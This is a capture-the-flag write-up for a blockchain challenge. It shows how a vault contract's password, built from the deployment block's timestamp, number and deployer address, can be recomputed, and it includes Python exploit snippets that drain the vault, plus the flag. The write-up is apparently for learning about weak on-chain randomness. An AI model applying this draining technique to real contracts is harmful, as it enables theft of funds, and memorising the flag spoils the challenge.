---
title: "Just in Time"
ctf: "platypwnies 2026"
date: 2026-11-14
category: blockchain
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{t1m3_15_n0t_4_s3cr3t::jrLLK4JVipAx}"
---

# Just in Time

## Summary

`Chal` ("our new vault") generates its password at deploy time from **public chain data** and
only stores its hash. The password is
`uint256(keccak256(abi.encodePacked(block.timestamp, block.number, msg.sender)))`, i.e. the
deployment block's timestamp, the deployment block number, and `msg.sender` inside the
`Chal` constructor — which is the `Setup` contract. All three inputs are readable from the
chain, so the password can be recomputed exactly and `withdraw(password)` drains the vault.

Win condition: `Setup.isSolved` → `address(TARGET).balance == 0`, starting from a 100 ETH
vault.

## Solution / Exploit

Source: `contracts/Chal.sol`, `contracts/Setup.sol`, exploit `justintime_exploit.py`.

### Step 1 — the weak password

```solidity
constructor payable {
 // A fresh password, generated at the exact moment the vault was created.
 // Not even we know it!
 uint256 password = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, msg.sender)));
 passwordHash = keccak256(abi.encodePacked(password));
}

function withdraw(uint256 password) external {
 require(keccak256(abi.encodePacked(password)) == passwordHash, "Wrong password");
 payable(msg.sender).transfer(address(this).balance);
}
```

`msg.sender` in the `Chal` constructor is `Setup` (Setup does `new Chal{value: 100 ether}`),
and `block.timestamp`/`block.number` are the ones of the block in which the challenge was
deployed. Nothing here is secret.

### Step 2 — locate the creation block

The vault address is `Setup.TARGET`. Its deploy block is found with a binary search over
`eth_getCode` (with a linear-scan fallback for pruned state):

```python
def find_creation_block(w3, address, latest=None):
 latest = latest if latest is not None else w3.eth.block_number
 lo, hi = 0, latest
 while lo < hi:
 mid = (lo + hi) // 2
 if w3.eth.get_code(address, block_identifier=mid):
 hi = mid
 else:
 lo = mid + 1
 return lo
```

Also accepts `CREATION_BLOCK` from the environment to skip the search.

### Step 3 — recompute the password

```python
blk = w3.eth.get_block(blk_no)
ts, num = blk["timestamp"], blk["number"]
seed = ts.to_bytes(32, "big") + num.to_bytes(32, "big") + bytes.fromhex(setup_addr[2:])
password = int.from_bytes(keccak(seed), "big")
```

Note the `abi.encodePacked` layout: each `uint256` is 32 big-endian bytes, the `address` is
20 raw bytes (lowercased hex, no `0x`).

### Step 4 — dry-run, then withdraw

```python
chal.functions.withdraw(password).call({"from": acct.address}) # must not revert
send(w3, acct, chal.functions.withdraw(password))
```

The dry-run fails loudly if the reconstruction is wrong. On success the vault transfers its
entire balance to the caller and `isSolved` becomes true.

### Run

```bash
RPC_URL=http://127.0.0.1:8545/<uuid> \
PRIVATE_KEY=<player key> \
SETUP_ADDRESS=<setup addr> \
FLAG='PP{t1m3_15_n0t_4_s3cr3t::jrLLK4JVipAx}' \
python3 justintime_exploit.py
```

### Expected output

No raw run log was retained; the block below is the literal format of the script's `print`
statements (not a captured transcript).

```
[*] TARGET 0x... balance 100000000000000000000 wei
[*] creation block N (timestamp T)
[*] recovered password 0x...
[+] password accepted by eth_call
[+] withdraw sent, TARGET balance now 0 wei
[+] isSolved = True
FLAG: PP{t1m3_15_n0t_4_s3cr3t::jrLLK4JVipAx}
```

## Flag(s)

```
PP{t1m3_15_n0t_4_s3cr3t::jrLLK4JVipAx}
```

## Notes / Pitfalls

- **`msg.sender` is Setup, not the player.** It is tempting to hash the attacker address —
 the constructor's `msg.sender` is the `Setup` contract that did `new Chal(...)`, and the
 exploit correctly uses `setup_addr`.
- **`abi.encodePacked`, not `abi.encode`.** The inputs are packed (uint256|uint256|address,
 32+32+20 bytes), which is what makes the reconstruction a simple byte concatenation.
 Using `abi.encode` or a different address casing would produce the wrong hash.
- **The deploy block is not the latest block.** The timestamp/number must come from the block
 where `TARGET` first got code — hence the binary search (or `CREATION_BLOCK=`). On a
 single-block dev chain the latest block happens to work, which is a common source of false
 confidence.
- **Dry-run first.** `eth_call` on `withdraw(password)` costs nothing and is the cheapest
 oracle that the password is right; it is done before spending gas.
